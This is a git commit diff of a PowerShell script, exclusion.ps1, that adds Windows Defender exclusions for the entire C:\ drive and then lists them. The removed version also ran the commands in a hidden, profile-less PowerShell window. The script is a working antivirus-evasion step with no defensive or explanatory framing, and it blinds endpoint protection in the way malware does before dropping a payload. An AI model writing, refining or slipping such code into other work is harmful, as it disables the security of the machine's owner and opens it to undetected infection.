b178799c663e816ce7fca9ec70c58f8632fc58b7
m4x7c <rizzbro995@gmail.com>
2026-01-04 02:03:08 +0600

    Update exclusion.ps1

--- exclusion.ps1
+++ exclusion.ps1
@@ -1,8 +1,4 @@
-$yourCode = @'
-$addExclusion = {param(`$p) Add-MpPreference -ExclusionPath `$p -Force}
-& `$addExclusion "C:\"
-& `$addExclusion "C:\*"
+$addExclusion = {param($p) Add-MpPreference -ExclusionPath $p -Force}
+& $addExclusion "C:\"
+& $addExclusion "C:\*"
 Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-'@
- 
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command $yourCode"
